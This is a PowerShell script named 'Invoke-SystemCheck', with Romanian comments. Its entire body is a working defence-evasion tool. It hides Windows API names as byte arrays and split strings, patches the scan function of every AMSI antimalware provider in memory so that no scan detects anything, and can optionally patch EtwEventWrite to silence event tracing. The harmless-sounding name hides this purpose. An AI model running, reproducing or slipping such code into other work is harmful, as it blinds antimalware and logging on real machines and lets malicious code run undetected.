
function Invoke-SystemCheck {
    [CmdletBinding()]
    param (
        [Parameter(ParameterSetName = 'Interface', Mandatory = $false, Position = 0)]
        [switch] $VerboseOutput,

        [Parameter(ParameterSetName = 'Interface', Mandatory = $false, Position = 0)]
        [switch] $DisableETW
    )

    if ($VerboseOutput) {
        $VerbosePreference = "Continue"
    }

    try {
        ## Funcții interne pentru obținerea adreselor și crearea delegatelor ##
        function Get-ProcAddress {
            Param(
                [string] $ModuleName,
                [string] $FunctionName
            )
            $ModuleHandle = $NtGetModuleHandle.Invoke($null, @($ModuleName))
            $tmpPtr = New-Object IntPtr
            $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $ModuleHandle)
            $NtGetAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $FunctionName))
        }

        function Get-Delegate {
            Param (
                [Parameter(Position = 0, Mandatory = $True)]
                [IntPtr] $FunctionAddress,
                [Parameter(Position = 1, Mandatory = $True)]
                [Type[]] $ArgumentTypes,
                [Parameter(Position = 2)]
                [Type] $ReturnType = [Void]
            )
            $delegateType = [AppDomain]::("Curren" + "tDomain").DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('SysQD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
                DefineDynamicModule('SysQM', $false).
                DefineType('SysQT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
            $delegateType.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ArgumentTypes).
                SetImplementationFlags('Runtime, Managed')
            $delegateType.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ArgumentTypes).
                SetImplementationFlags('Runtime, Managed')
            $delType = $delegateType.CreateType()
            [System.Runtime.InteropServices.Marshal]::("GetDelegate" + "ForFunctionPointer")($FunctionAddress, $delType)
        }

        ## Pregătire pentru utilizarea metodelor native ##
        try {
            Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        }
        catch {
            Throw "[!] Eșec la adăugarea assembly-ului Windows Forms"
        }

        $marshal = [System.Runtime.InteropServices.Marshal]
        $UnsafeMethods = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')

        # Șiruri de caractere "ofuscate" în bytes ASCII
        $bytesGetProc    = [Byte[]](0x47,0x65,0x74,0x50,0x72,0x6F,0x63,0x41,0x64,0x64,0x72,0x65,0x73,0x73)
        $bytesGetModule  = [Byte[]](0x47,0x65,0x74,0x4D,0x6F,0x64,0x75,0x6C,0x65,0x48,0x61,0x6E,0x64,0x6C,0x65)
        $NtGetProcName   = [System.Text.Encoding]::ASCII.GetString($bytesGetProc)
        $NtGetModuleName = [System.Text.Encoding]::ASCII.GetString($bytesGetModule)

        $NtGetModuleHandle = $UnsafeMethods.GetMethod($NtGetModuleName)
        if ($NtGetModuleHandle -eq $null) {
            Throw "[!] Eroare la obținerea adresei de $NtGetModuleName"
        }
        $NtGetAddress = $UnsafeMethods.GetMethod($NtGetProcName)
        if ($NtGetAddress -eq $null) {
            Throw "[!] Eroare la obținerea adresei de $NtGetProcName"
        }

        # Șiruri de caractere referitoare la biblioteca AMSI
        $bytesAmsiInit = [Byte[]](0x41,0x6D,0x73,0x69,0x49,0x6E,0x69,0x74,0x69,0x61,0x6C,0x69,0x7A,0x65)
        $bytesAmsiDLL  = [Byte[]](0x61,0x6d,0x73,0x69,0x2e,0x64,0x6c,0x6c)
        $amsiDLL = [System.Text.Encoding]::ASCII.GetString($bytesAmsiDLL)
        $amsiInitialize = [System.Text.Encoding]::ASCII.GetString($bytesAmsiInit)

        $amsiInitAddr = Get-ProcAddress $amsiDLL $amsiInitialize
        if ($amsiInitAddr -eq $null) {
            Throw "[!] Eroare la obținerea adresei de $amsiInitialize"
        }

        # Obținerea delegatului pentru funcția de inițializare
        $PtrSize = $marshal::SizeOf([Type][IntPtr])
        if ($PtrSize -eq 8) {
            $amsiInitDelegate = Get-Delegate $amsiInitAddr @([string], [UInt64].MakeByRefType()) ([Int])
            [Int64]$amsiContext = 0
        }
        else {
            $amsiInitDelegate = Get-Delegate $amsiInitAddr @([string], [IntPtr].MakeByRefType()) ([Int])
            $amsiContext = 0
        }

        # Pregătire pentru modificarea permisiunilor de memorie
        $protectSuffix = 'Virt' + 'ualProtec'
        $protectMethodName = '{0}{1}' -f $protectSuffix, 't'
        $kernelDLL = "ker{0}.dll" -f "nel32"
        $protectAddr = Get-ProcAddress $kernelDLL $protectMethodName
        if ($protectAddr -eq $null) {
            Throw "[!] Eroare la obținerea adresei de $protectMethodName"
        }
        $memProtectDelegate = Get-Delegate $protectAddr @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])

        $PAGE_EXECUTE_WRITECOPY = 0x00000080
        $patchBytes = [byte[]](0xb8,0x0,0x00,0x00,0x00,0xC3)
        $origProt = 0
        $providerIndex = 0

        if ($amsiInitDelegate.Invoke("Scanner", [ref]$amsiContext) -ne 0) {
            if ($amsiContext -eq 0) {
                Throw "[!] Niciun furnizor găsit."
            }
            else {
                Throw "[!] Eroare la apelarea $amsiInitialize"
            }
        }

        # Localizarea listei de furnizori AMSI
        if ($PtrSize -eq 8) {
            $AmsiAntimalware = $marshal::ReadInt64([IntPtr]$amsiContext, 16)
            $ProviderPtr = $marshal::ReadInt64([IntPtr]$AmsiAntimalware, 64)
        }
        else {
            $AmsiAntimalware = $marshal::ReadInt32($amsiContext + 8)
            $ProviderPtr = $marshal::ReadInt32($AmsiAntimalware + 36)
        }

        # Buclă pentru aplicarea patch-ului pe fiecare furnizor AMSI
        while ($ProviderPtr -ne 0) {
            if ($PtrSize -eq 8) {
                $ProviderVtbl = $marshal::ReadInt64([IntPtr]$ProviderPtr)
                $ScanFuncAddr = $marshal::ReadInt64([IntPtr]$ProviderVtbl, 24)
            }
            else {
                $ProviderVtbl = $marshal::ReadInt32($ProviderPtr)
                $ScanFuncAddr = $marshal::ReadInt32($ProviderVtbl + 12)
            }

            if (-not $memProtectDelegate.Invoke($ScanFuncAddr, [uint32]6, $PAGE_EXECUTE_WRITECOPY, [ref]$origProt)) {
                Throw "[!] Eroare la modificarea protecției memoriei la $ScanFuncAddr"
            }

            try {
                $marshal::Copy($patchBytes, 0, [IntPtr]$ScanFuncAddr, 6)
            }
            catch {
                Throw "[!] Eroare la scrierea patch-ului la adresa: $ScanFuncAddr"
            }

            for ($i = 0; $i -lt $patchBytes.Length; $i++) {
                $byteVal = $marshal::ReadByte([IntPtr]::Add($ScanFuncAddr, $i))
                if ($byteVal -ne $patchBytes[$i]) {
                    Throw "[!] Eșec la aplicarea patch-ului la $ScanFuncAddr"
                }
            }

            if (-not $memProtectDelegate.Invoke($ScanFuncAddr, [uint32]6, $origProt, [ref]$origProt)) {
                Throw "[!] Eșec la restaurarea protecției memoriei la $ScanFuncAddr"
            }

            $providerIndex++
            if ($PtrSize -eq 8) {
                $ProviderPtr = $marshal::ReadInt64([IntPtr]$AmsiAntimalware, 64 + ($providerIndex * $PtrSize))
            }
            else {
                $ProviderPtr = $marshal::ReadInt32($AmsiAntimalware + 36 + ($providerIndex * $PtrSize))
            }
        }

        if ($DisableETW) {
            $etwFuncName = [System.Text.Encoding]::ASCII.GetString([Byte[]](0x45,0x74,0x77,0x45,0x76,0x65,0x6E,0x74,0x57,0x72,0x69,0x74,0x65))
            $etwAddr = Get-ProcAddress ("nt{0}.dll" -f "dll") $etwFuncName
            if ($etwAddr -eq $null) {
                Throw "[!] Eroare la obținerea adresei de $etwFuncName"
            }

            if (-not $memProtectDelegate.Invoke($etwAddr, 1, $PAGE_EXECUTE_WRITECOPY, [ref]$origProt)) {
                Throw "[!] Eroare la modificarea protecției memoriei la $etwFuncName"
            }

            try {
                if ($PtrSize -eq 8) {
                    $marshal::WriteByte($etwAddr, 0xC3)
                }
                else {
                    $etwPatch = [byte[]](0xb8,0xff,0x55)
                    $marshal::Copy($etwPatch, 0, [IntPtr]$etwAddr, 3)
                }
            }
            catch {
                Throw "[!] Eroare la scrierea patch-ului la $etwFuncName"
            }
            
            if (-not $memProtectDelegate.Invoke($etwAddr, 1, $origProt, [ref]$origProt)) {
                Throw "[!] Eșec la restaurarea protecției memoriei la $etwFuncName"
            }

            if ($PtrSize -eq 8) {
                $byteVal = $marshal::ReadByte([IntPtr]::Add($etwAddr, 0))
                if ($byteVal -ne 0xc3) {
                    Throw "[!] Eșec la aplicarea patch-ului la $etwFuncName"
                }
            }
            else {
                for ($j = 0; $j -lt 3; $j++) {
                    $byteVal = $marshal::ReadByte([IntPtr]::Add($etwAddr, $j))
                    if ($byteVal -ne $etwPatch[$j]) {
                        Throw "[!] Eșec la aplicarea patch-ului la $etwFuncName"
                    }
                }
            }

            Write-Output "[*] Sucess."
        }
        else {
            Write-Output "[*] Injecting."
        }
    }
    catch {
        Throw $_
    }
}

